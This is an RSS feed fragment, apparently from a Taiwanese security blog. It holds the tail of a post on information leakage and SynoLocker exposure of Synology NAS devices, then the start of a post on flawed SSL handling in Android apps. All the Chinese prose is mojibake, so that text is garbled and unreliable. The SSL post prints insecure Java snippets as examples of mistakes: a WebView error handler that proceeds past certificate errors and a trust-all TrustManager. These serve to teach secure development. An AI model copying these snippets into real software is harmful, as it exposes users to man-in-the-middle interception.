&lt;p&gt;å°æ–¼é€™æ¨£æµ·é‡æ”¶é›†è³‡æ–™è¡ç”Ÿçš„è³‡å®‰è­°é¡Œï¼Œæˆ‘å€‘èªç‚ºæœ€å¤§çš„å—å®³è€…ï¼Œæ˜¯ç‰©è¯ç¶²çš„ä½¿ç”¨è€…ï¼å°±æˆ‘å€‘çš„è§€å¯Ÿï¼Œç‰©è¯ç¶²çš„è¨­å‚™é€šå¸¸å®‰å…¨é˜²è­·ä¸ä½³ï¼Œå®¹æ˜“é­å—åˆ°é§­å®¢æ”»æ“Šï¼Œå‰é™£å­ &lt;a href=&quot;http://www8.hp.com/us/en/hp-news/press-release.html?id=1744676&quot;&gt;HP ä¹Ÿå‡ºäº†ä¸€ä»½å ±å‘ŠæŒ‡å‡º&lt;/a&gt;ï¼Œç‰©è¯ç¶²çš„è¨­å‚™æœ‰ä¸ƒæˆå­˜åœ¨å¼±é»ï¼Œè€Œä¸”æ¯å°è¨­å‚™å¹³å‡æœ‰ 25 å€‹å¼±é»ã€‚é™¤æ­¤ä¹‹å¤–ï¼Œç‰©è¯ç¶²çš„è¨­å‚™ä¸æ˜“æ›´æ–°ï¼Œå°‘æœ‰äººæœƒå®šæœŸæ›´æ–°ï¼Œæ›´å°è‡´ç‰©è¯ç¶²è¨­å‚™å¯ä»¥è¢«å¤§ç¯„åœçš„æ”»æ“Šï¼Œé€²è€Œæ»²é€å®¶ç”¨ç¶²è·¯ï¼Œå±å®³ä½¿ç”¨è€…å±…å®¶éš±ç§ã€‚é€™æ˜¯å€‹æœªä¾†éœ€è¦æŒçºŒé—œæ³¨çš„é‡è¦è­°é¡Œã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20140826/synolocker.jpg&quot; alt=&quot;ä»æš´éœ²åœ¨ SynoLocker é¢¨éšªç‹€æ³çµ±è¨ˆ&quot; /&gt;&lt;/p&gt;

&lt;p&gt;æœ€å¾Œï¼Œæˆ‘å€‘ç”¨æœ€è¿‘ SynoLocker çš„æ¡ˆä¾‹ç‚ºå¤§æ•¸æ“šè³‡æ–™è’é›†ä½œçµï¼ŒSynoLocker æ˜¯ä¸€æ¬¾é‡å° Synology çš„å‹’ç´¢è»Ÿé«”ï¼Œå»å¹´åº• Synology å®˜æ–¹å·²ç¶“æ¨å‡ºæ–°ç‰ˆä¿®æ­£å•é¡Œï¼Œæœ¬æœˆ SynoLocker æ“´æ•£è‡³å…¨ä¸–ç•Œï¼Œæ–°èä¸€å†å¼·èª¿éœ€è¦æ›´æ–° NASï¼Œä½†æˆ‘å€‘é‡å°å°ç£ 1812 å°å°å¤–é–‹æ”¾çš„ Synology NAS åšçµ±è¨ˆï¼Œè‡³ä»Šä»ç™¼ç¾æœ‰ 64ï¼… çš„ä½¿ç”¨è€…æ²’æœ‰æ›´æ–°ï¼Œä¹Ÿå°±æ˜¯é€™äº› NAS ä»æš´éœ²åœ¨ SynoLocker çš„é¢¨éšªä¸­ã€‚é€™ä»¶äº‹æƒ…åˆå†æ¬¡è­‰æ˜é§­å®¢æœ‰èƒ½åŠ›åœ¨çŸ­æ™‚é–“åˆ©ç”¨å¤§æ•¸æ“šè³‡æ–™æ‰¾åˆ°æ”»æ“Šç›®æ¨™ï¼Œä¹Ÿé †å¸¶èªªæ˜äº†å°ç£è³‡å®‰æ„è­˜æ™®éä¸è¶³çš„å•é¡Œã€‚&lt;/p&gt;

&lt;h3 id=&quot;çµè«–&quot;&gt;çµè«–&lt;/h3&gt;

&lt;p&gt;åœ¨é€™æ¬¡è­°é¡Œæˆ‘å€‘é—œæ³¨äº†å¾ˆå¤è€çš„è³‡è¨Šæ´©æ¼å•é¡Œï¼Œä¸¦ä¸”ç™¼ç¾ç›®å‰å°ç£ä¸€äº›ç†±é–€ç¶²ç«™ä»ç„¶å­˜åœ¨é€™æ¨£çš„å•é¡Œã€‚è³‡è¨Šæ´©æ¼ä¹Ÿè¨±ä¸æ˜¯ä¸€ä»¶å¾ˆåš´é‡çš„äº‹æƒ…ï¼Œä½†å¾€å¾€èƒ½æ¿€èµ·é§­å®¢é«˜æ¼²çš„æƒ…ç·’ï¼Œé§­å®¢æœƒèªç‚ºä¸€å€‹ç¶²ç«™é€£æœ€æœ€æœ€åŸºæœ¬çš„è³‡æ–™ä¿è­·éƒ½æ²’æœ‰åšåˆ°ï¼Œä¸€å®šæœƒå­˜åœ¨å…¶ä»–è³‡å®‰å•é¡Œï¼Œé€²è€Œé€²è¡Œæ›´å¤§é‡çš„æ”»æ“Šè¡Œç‚ºã€‚è€Œäº‹å¯¦ä¸Šï¼Œæˆ‘å€‘ä¹Ÿå¾å¯¦ä¾‹è­‰æ˜äº†å…¶å¯¦è³‡è¨Šæ´©æ¼å¯ä»¥å¾ˆåš´é‡ï¼Œå¸Œæœ›ç¶²ç«™æä¾›è€…èƒ½å¤ æ³¨é‡é€™å€‹ç°¡å–®å¯è§£æ±ºä¸”é‡è¦çš„è­°é¡Œã€‚&lt;/p&gt;

&lt;p&gt;æˆ‘å€‘ä¹Ÿæåˆ°äº†é§­å®¢é€éå¹³å¸¸å¤§é‡çš„è³‡æ–™æ”¶é›†ï¼Œåœ¨éœ€è¦çš„æ™‚å€™èƒ½å¿«é€Ÿæ‰¾åˆ°ç›®æ¨™ä¸¦ä¸”å¤§ç¯„åœæ”»æ“Šã€‚é€™å…¶ä¸­åˆä»¥ç‰©è¯ç¶²çš„ç”¨æˆ¶å½±éŸ¿æœ€å¤šã€‚é¢å°é€™æ¨£çš„è­°é¡Œï¼Œæˆ‘å€‘å»ºè­°é™¤äº†é©ç•¶çš„éš±è—(å½é€ )ä¸»æ©Ÿç‰ˆæœ¬è³‡è¨Šä»¥é¿å…å‡ºç¾ 0-Day æ™‚æˆç‚ºé¦–è¦æ”»æ“Šç›®æ¨™ã€‚æˆ‘å€‘ä¹Ÿæå€¡è¦å°è‡ªå·±çš„æœå‹™åšæ™®æŸ¥ï¼Œäº†è§£è‡ªå·±åˆ°åº•å°å¤–é–‹å•Ÿäº†ä»€éº¼æœå‹™ï¼Œä»¥åŠé—œæ³¨è‡ªå·±ä½¿ç”¨çš„&lt;a href=&quot;http://devco.re/blog/2014/03/14/3rd-party-software-security-issues/&quot;&gt;ç¬¬ä¸‰æ–¹å¥—ä»¶&lt;/a&gt;æ˜¯å¦æœ‰å®‰å…¨æ›´æ–°ã€‚&lt;/p&gt;

&lt;p&gt;å¸Œæœ›æ˜å¹´ä¸éœ€è¦å†æœ‰ä¸€ç¯‡ã€ä¾èˆŠæ²’æ”¹è®Šçš„è³‡è¨Šæ´©æ¼ã€ï¼å¤§å®¶å¿«é»æ³¨æ„é€™ä»¶ç°¡å–®çš„äº‹æƒ…å§ï¼&lt;/p&gt;

</description>
                <link>https://devco.re/blog/2014/08/26/information-leakage-in-taiwan-HITCON2014/</link>
                <guid>https://devco.re/blog/2014/08/26/information-leakage-in-taiwan-HITCON2014</guid>
                <pubDate>Tue, 26 Aug 2014 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>æ‰‹æ©Ÿæ‡‰ç”¨ç¨‹å¼é–‹ç™¼ä¸Šè¢«å¿½ç•¥çš„ SSL è™•ç†</title>
                <description>&lt;p&gt;åœ¨ç¶²è·¯ä¸Šå‚³è¼¸æ•æ„Ÿè³‡è¨Šæ™‚ï¼Œé€šå¸¸æœƒä½¿ç”¨ HTTPS å”å®šï¼Œè®“å®¢æˆ¶ç«¯èˆ‡ä¼ºæœå™¨ç«¯å°è³‡æ–™é€²è¡Œ SSL åŠ å¯†è™•ç†ï¼Œä»¥é™ä½è³‡æ–™åœ¨å‚³è¼¸éç¨‹ä¸­è¢«ç›£è½æˆ–ä¸­é–“äººæ”»æ“Šçš„é¢¨éšªã€‚HTTPS çš„é‡è¦æ€§é€æ¼¸è¢«é‡è¦–ï¼ŒGoogle é™¤äº†é è¨­é–‹å•Ÿ HTTPS ä¹‹å¤–ï¼Œæœªä¾†æ›´æœƒå°‡ &lt;a href=&quot;http://googlewebmastercentral.blogspot.tw/2014/08/https-as-ranking-signal.html&quot;&gt;HTTPS çš„ç¶²ç«™æœå°‹æ’ååŠ åˆ†&lt;/a&gt;ã€‚ä½†ç‚ºäº†ç¢ºä¿å‚³è¼¸çš„å®‰å…¨ï¼Œéç¨‹ä¸­å®¢æˆ¶ç«¯æœƒæ ¸å°ä¼ºæœå™¨çš„æ†‘è­‰éˆ (certificate chain) æ˜¯å¦æœ‰æ•ˆï¼Œè‹¥åˆ¤å®šç‚ºç„¡æ•ˆæ™‚æœƒä½œå‡ºè­¦å‘Šã€‚(è©³è¦‹&lt;a href=&quot;http://en.wikipedia.org/wiki/Secure_Sockets_Layer&quot;&gt;Wikipedia&lt;/a&gt;)&lt;/p&gt;

&lt;!-- more --&gt;
&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20140815/desktop_browser_insecure_warning.png&quot; alt=&quot;Desktop è­¦å‘Šåœ–&quot; /&gt;&lt;br /&gt;
è€Œåœ¨æ‰‹æ©Ÿæ‡‰ç”¨ç¨‹å¼ä¸Š HTTPS åŒæ¨£é‡è¦ï¼Œä¾‹å¦‚ç¶²è·¯éŠ€è¡Œã€ç·šä¸Šè³¼ç‰©ç­‰ã€‚ç³»çµ±åŒæ¨£æœƒåšæ†‘è­‰æ ¸å°ï¼Œä½†å°è¢«åˆ¤å®šç‚ºç„¡æ•ˆçš„æ†‘è­‰å°±éœ€è¦é–‹ç™¼è€…ä½œå‡ºé¡å¤–çš„è™•ç†äº†ã€‚è¨±å¤šæ‰‹æ©Ÿæ‡‰ç”¨ç¨‹å¼é–‹ç™¼å•†åœ¨é€™å€‹éƒ¨åˆ†ä¸¦æ²’æœ‰å¦¥å–„è™•ç†å¥½ï¼Œä»¥ä¸‹æˆ‘å€‘å°±å¹¾å€‹å¸¸è¦‹çš„æˆå› åšåŸºæœ¬çš„æ¢è¨ã€‚&lt;/p&gt;

&lt;h3 id=&quot;æœƒè¢«ç³»çµ±åˆ¤å®šç‚ºç„¡æ•ˆçš„å¸¸è¦‹æˆå› &quot;&gt;æœƒè¢«ç³»çµ±åˆ¤å®šç‚ºç„¡æ•ˆçš„å¸¸è¦‹æˆå› ï¼Ÿ&lt;/h3&gt;
&lt;p&gt;åœ¨æ¢è¨è©²å¦‚ä½•è™•ç†é€™å€‹å•é¡Œä¹‹å‰ï¼Œé€™è£¡å…ˆåˆ—å‡ºä¸€äº›æœ‰å¯èƒ½è¢«ç³»çµ±åˆ¤å®šæˆç„¡æ•ˆæ†‘è­‰çš„æˆå› ã€‚&lt;/p&gt;

&lt;h4 id=&quot;1-ç³»çµ±æ”¯æ´å•é¡Œ-&quot;&gt;1. ç³»çµ±æ”¯æ´å•é¡Œ &lt;sup id=&quot;fnref:note1&quot;&gt;&lt;a href=&quot;#fn:note1&quot; class=&quot;footnote&quot;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;/h4&gt;
&lt;p&gt;åœ¨ Android 2.2 åŠä¹‹å‰çš„ç‰ˆæœ¬ï¼Œå° SSL çš„æ”¯æ´ä¸Šå­˜åœ¨è‘—ä¸€äº›å•é¡Œï¼Œåƒæ˜¯ &lt;a href=&quot;https://code.google.com/p/android/issues/detail?id=12908&quot;&gt;SNI&lt;/a&gt; å’Œ &lt;a href=&quot;https://code.google.com/p/android/issues/detail?id=26542&quot;&gt;Multiple Chain&lt;/a&gt;ã€‚è€Œ Android ä¸Šä¸æ¥å—ç¼ºå°‘ä¸­ç¹¼ CA æ†‘è­‰çš„æ†‘è­‰éˆï¼Œä¾‹å¦‚ï¼š&lt;a href=&quot;https://egov.uscis.gov/&quot;&gt;https://egov.uscis.gov/&lt;/a&gt;&lt;/p&gt;

&lt;h4 id=&quot;2-ç›¸é—œæ†‘è­‰æœªè¢«é è¼‰åˆ°ç³»çµ±ä¸­&quot;&gt;2. ç›¸é—œæ†‘è­‰æœªè¢«é è¼‰åˆ°ç³»çµ±ä¸­&lt;/h4&gt;
&lt;p&gt;ä»¥ GCA ç°½ç™¼çš„ SSL æ†‘è­‰ç‚ºä¾‹ï¼Œåœ¨ Windows ä¸Šè¢«åˆ¤å®šç‚ºæœ‰æ•ˆï¼Œä½†åœ¨ iOS ç³»çµ±ä¸Šå»å› ç‚º CA ä¸åœ¨ç³»çµ±çš„é è¼‰æ¸…å–®ä¸­è€Œè¢«åˆ¤å®šç‚ºç„¡æ•ˆã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20140815/windows_recognize_gca.png&quot; alt=&quot;Windows&quot; /&gt;&lt;br /&gt;
&lt;img src=&quot;/assets/img/blog/20140815/iphone_unknown_ca.png&quot; alt=&quot;iPhone&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;3-ä½¿ç”¨è‡ªè¡Œç°½ç™¼çš„æ†‘è­‰&quot;&gt;3. ä½¿ç”¨è‡ªè¡Œç°½ç™¼çš„æ†‘è­‰&lt;/h4&gt;
&lt;p&gt;é€™ç¨®æƒ…æ³å¸¸å‡ºç¾åœ¨æ‡‰ç”¨ç¨‹å¼é–‹ç™¼éšæ®µçš„å…§éƒ¨æ¸¬è©¦ç’°å¢ƒä¸­ï¼Œç”±æ–¼æ˜¯å…§éƒ¨æ¸¬è©¦ç’°å¢ƒä¸€èˆ¬éƒ½ä¸æœƒèŠ±éŒ¢å»ç”³è«‹æ†‘è­‰ã€‚&lt;/p&gt;

&lt;h4 id=&quot;4-é€£ç·šè¢«ä¸­é–“äººmitmæ”»æ“Š&quot;&gt;4. é€£ç·šè¢«ä¸­é–“äºº(MITM)æ”»æ“Š&lt;/h4&gt;
&lt;p&gt;ç•¶é€£ç·šè¢« MITM æ”»æ“Šæ™‚ï¼Œä½¿ç”¨è€…åŸæœ¬çš„é€£ç·šç›®çš„åœ°æœƒè¢«å°åˆ°æ”»æ“Šè€…çš„è¨­å‚™ä¸Šï¼Œæ­¤æ™‚ä¼ºæœå™¨æ†‘è­‰ä¹Ÿæœƒè¢«å–ä»£æˆæ”»æ“Šè€…è‡ªè¡Œç°½ç™¼çš„æ†‘è­‰ï¼Œé€ æˆåŸæœ¬æ­£å¸¸çš„é€£ç·šå‡ºç¾ç•°å¸¸ã€‚&lt;/p&gt;

&lt;h3 id=&quot;é–‹ç™¼è€…è©²å¦‚ä½•è™•ç†&quot;&gt;é–‹ç™¼è€…è©²å¦‚ä½•è™•ç†ï¼Ÿ&lt;/h3&gt;

&lt;p&gt;ç†æƒ³æƒ…æ³ä¸‹ï¼Œå®¢æˆ¶ç«¯çš„æ”¯æ´åº¦å……è¶³ï¼Œä¼ºæœå™¨æ†‘è­‰éˆçš„ä¾†æºåŠè¨­å®šæ­£ç¢ºï¼Œåªéœ€ä½¿ç”¨ç³»çµ±åŸæœ‰çš„æ–¹å¼å»æª¢æŸ¥æ†‘è­‰å³å¯é”åˆ°å®‰å…¨æ•ˆæœã€‚ä½†è‹¥éå¾—è¦ç›¸å®¹ä½ç‰ˆæœ¬ç³»çµ±æˆ–æ˜¯è‡ªè¡Œç°½ç™¼æ†‘è­‰çš„æ™‚å€™ï¼Œå°±å¾—è‡ªè¡Œåšé¡å¤–çš„æª¢æŸ¥ã€‚&lt;/p&gt;

&lt;p&gt;åœ¨è™•ç†æ–¹å¼ä¸Šï¼Œæ™®éæ˜¯ä½¿ç”¨æ†‘è­‰ç¶å®š (certificate pinning) çš„æ–¹å¼ï¼ŒæŠŠéœ€è¦æ¯”å°çš„æ†‘è­‰é å…ˆå­˜æ”¾åœ¨æ‡‰ç”¨ç¨‹å¼è£¡ï¼Œå¾…è¦é€²è¡Œ SSL Handshake çš„æ™‚å€™å†èˆ‡ä¼ºæœå™¨çš„æ†‘è­‰åšæ¯”å°ã€‚&lt;/p&gt;

&lt;p&gt;å¯æ˜¯åœ¨å¯¦å‹™ä¸Šï¼Œå¤§å¤šé–‹ç™¼äººå“¡æ¡ç”¨æ¶ˆæ¥µçš„æ–¹æ³•ï¼ŒæŠŠéŒ¯èª¤è­¦å‘Šç•¥éè®“é€£ç·šç¹¼çºŒé€²è¡Œï¼Œä½¿å¾—æœ¬ä¾†ä½¿ç”¨ SSL åŠ å¯†é€£ç·šå¸¶ä¾†çš„å®‰å…¨æ€§å½¢åŒè™›è¨­ã€‚æ“š 2012 å¹´ &lt;a href=&quot;http://android-ssl.org/files/p50-fahl.pdf&quot;&gt;Why Eve and Mallory Love Android: An Analysis of SSL (In)Security on Android&lt;/a&gt; é€™ç¯‡è«–æ–‡æŒ‡å‡ºï¼Œåœ¨ Google Play ä¸Š 13500 å€‹å…è²»ç†±é–€æ‡‰ç”¨ç¨‹å¼ç•¶ä¸­ï¼Œå…±æœ‰ 1074 å€‹ (8%) æ‡‰ç”¨ç¨‹å¼å› éŒ¯èª¤çš„ SSL è™•ç†è€Œå°è‡´ä½¿ç”¨è€…é™·å…¥ MITM æ”»æ“Šçš„é¢¨éšªä¸­ã€‚&lt;/p&gt;

&lt;p&gt;ä¸‹é¢æˆ‘å€‘æ•´ç†äº†ä¸€äº›åœ¨æ‰‹æ©Ÿæ‡‰ç”¨é–‹ç™¼ä¸Šï¼Œå¸¸è¦‹çš„ SSL è™•ç†éŒ¯èª¤ï¼Œä»¥åŠå…¶å°æ‡‰é©ç•¶çš„è™•ç†æ–¹æ³•ã€‚&lt;/p&gt;

&lt;h4 id=&quot;android-éŒ¯èª¤è™•ç†æƒ…æ³1&quot;&gt;Android éŒ¯èª¤è™•ç†æƒ…æ³1&lt;/h4&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-java&quot; data-lang=&quot;java&quot;&gt;&lt;span class=&quot;lineno&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;nd&quot;&gt;@Override&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;onReceivedSslError&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;WebView&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;view&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SslErrorHandler&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;handler&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SslError&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;error&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;3&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;handler&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;proceed&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;4&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;ç•¶é€é WebView å…ƒä»¶è¨ªå• HTTPS ç¶²ç«™ç™¼ç”Ÿ SSL éŒ¯èª¤æ™‚ï¼Œæœƒè§¸ç™¼ onReceivedSslError é€™å€‹å‡½æ•¸ã€‚æ ¹æ“šå®˜æ–¹æ–‡ä»¶æŒ‡å‡ºï¼Œå¯è—‰ç”±åŸ·è¡Œ handler.proceed() æˆ–æ˜¯ handler.cancel() ä¾†æ±ºå®šæ˜¯å¦è®“é€£ç·šç¹¼çºŒé€²è¡Œã€‚åœ¨ä¸è¦†å¯«é€™å‡½æ•¸çš„æƒ…æ³ä¸‹é è¨­æœƒåŸ·è¡Œ handler.cancel()ã€‚è€Œä¸Šé¢çš„åšæ³•å»è®“ç•°å¸¸çš„é€£ç·šç¹¼çºŒé€²è¡Œäº†ã€‚&lt;/p&gt;

&lt;p&gt;è¼ƒç‚ºæ°ç•¶çš„åšæ³•æ˜¯ä½¿ç”¨ handler.cancel() è®“é€£ç·šçµ‚æ­¢ï¼Œæˆ–æ˜¯é™åˆ¶åœ¨é–‹ç™¼éšæ®µæ‰åŸ·è¡Œ handler.proceed()ã€‚åƒ &lt;a href=&quot;https://github.com/apache/cordova-android/blob/3.5.1/framework/src/org/apache/cordova/CordovaWebViewClient.java#L298&quot;&gt;Apache Coradova&lt;/a&gt; å’Œ &lt;a href=&quot;https://github.com/facebook/facebook-android-sdk/blob/sdk-version-3.15.0/facebook/src/com/facebook/widget/WebDialog.java#L420&quot;&gt;Facebook Android SDK&lt;/a&gt; çš†æœ‰å°é€™éƒ¨åˆ†åšæ§ç®¡ã€‚&lt;/p&gt;

&lt;h4 id=&quot;android-éŒ¯èª¤è™•ç†æƒ…æ³2&quot;&gt;Android éŒ¯èª¤è™•ç†æƒ…æ³2&lt;/h4&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-java&quot; data-lang=&quot;java&quot;&gt;&lt;span class=&quot;lineno&quot;&gt; 1&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TrustManager&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;trustAllManager&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TrustManager&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;X509TrustManager&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 2&lt;/span&gt;     &lt;span class=&quot;nd&quot;&gt;@Override&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 3&lt;/span&gt;     &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;checkClientTrusted&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;X509Certificate&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;chain&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;authType&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 4&lt;/span&gt;     &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 5&lt;/span&gt; 
&lt;span class=&quot;lineno&quot;&gt; 6&lt;/span&gt;     &lt;span class=&quot;nd&quot;&gt;@Override&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 7&lt;/span&gt;     &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;checkServerTrusted&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;X509Certificate&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;chain&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;authType&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 8&lt;/span&gt;     &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 9&lt;/span&gt; 
&lt;span class=&quot;lineno&quot;&gt;10&lt;/span&gt;     &lt;span class=&quot;nd&quot;&gt;@Override&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;11&lt;/span&gt;     &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;X509Certificate&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;getAcceptedIssuers&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;12&lt;/span&gt;         &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;13&lt;/span&gt;     &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;14&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;};&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;15&lt;/span&gt; 
&lt;span class=&quot;lineno&quot;&gt;16&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SSLContext&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sslContext&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SSLContext&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getInstance&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;TLS&amp;quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;17&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sslContext&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;init&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;trustAllManager&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;æœ¬ç”¨ä¾†æª¢æŸ¥ä¼ºæœå™¨æ†‘è­‰çš„ checkServerTrusted è¢«ç•™ç©ºï¼Œå°è‡´è­¦å‘Šè¢«ç•¥éã€‚Google å»ºè­°ä¸è¦è‡ªè¡Œå¯¦ä½œ TrustManagerï¼Œè€Œæ˜¯æŠŠæ†‘è­‰æ”¾åˆ° KeyStoreï¼Œå†æŠŠ KeyStore æ”¾åˆ° TrustManagerFactoryï¼Œæœ€å¾Œå¾ TrustManagerFactory ç”¢å‡ºç›¸é—œçš„ TrustManagerï¼Œé–‹ç™¼æ–‡ä»¶ä¸­æœ‰æä¾›è™•ç†çš„&lt;a href=&quot;https://developer.android.com/training/articles/security-ssl.html#UnknownCa&quot;&gt;ç¯„ä¾‹&lt;/a&gt;ã€‚OWASP çš„ WIKI ä¸Šä¹Ÿæœ‰æä¾›è‡ªè¡Œå¯¦ä½œ TrustManager åš certificate pinning çš„&lt;a href=&quot;https://www.owasp.org/index.php/Certificate_and_Public_Key_Pinning#Android&quot;&gt;ç¯„ä¾‹&lt;/a&gt;ã€‚&lt;sup id=&quot;fnref:note2&quot;&gt;&lt;a href=&quot;#fn:note2&quot; class=&quot;footnote&quot;&gt;2&lt;/a&gt;&lt;/sup&gt;&lt;/p&gt;

&lt;p&gt;ä¸‹é¢ç¯€éŒ„ Android å®˜æ–¹æ–‡ä»¶ä¸Šçš„ç¯„ä¾‹ï¼š&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-java&quot; data-lang=&quot;java&quot;&gt;&lt;span class=&quot;lineno&quot;&gt; 1&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;KeyStore&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;keyStore&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;...;&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 2&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;algorithm&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TrustManagerFactory&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getDefaultAlgorithm&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
